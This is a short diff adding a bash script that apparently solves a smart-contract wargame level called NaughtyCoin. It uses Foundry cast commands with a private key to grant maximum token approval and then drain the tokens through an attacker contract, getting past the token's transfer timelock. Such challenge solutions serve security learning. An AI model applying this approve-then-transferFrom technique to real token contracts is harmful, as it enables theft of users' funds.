@@ -1,0 +1,11 @@
+#!/bin/bash
+
+set -e -o pipefail
+
+source key
+CON=0x57bD51f06fA24422F3C6DA7aC7BCD1f51Fe3598c
+
+# forge create --private-key $KEY '15.naughty_coin.sol:NaughtyCoin'
+COIN=0xa12a25c4dda78b2e5a110017a8c82a3d30929115
+cast send --private-key $KEY $CON 'approve(address,uint256)' $COIN $(cast --max-uint)
+cast send --private-key $KEY $COIN 'takeThem(address)' $CON
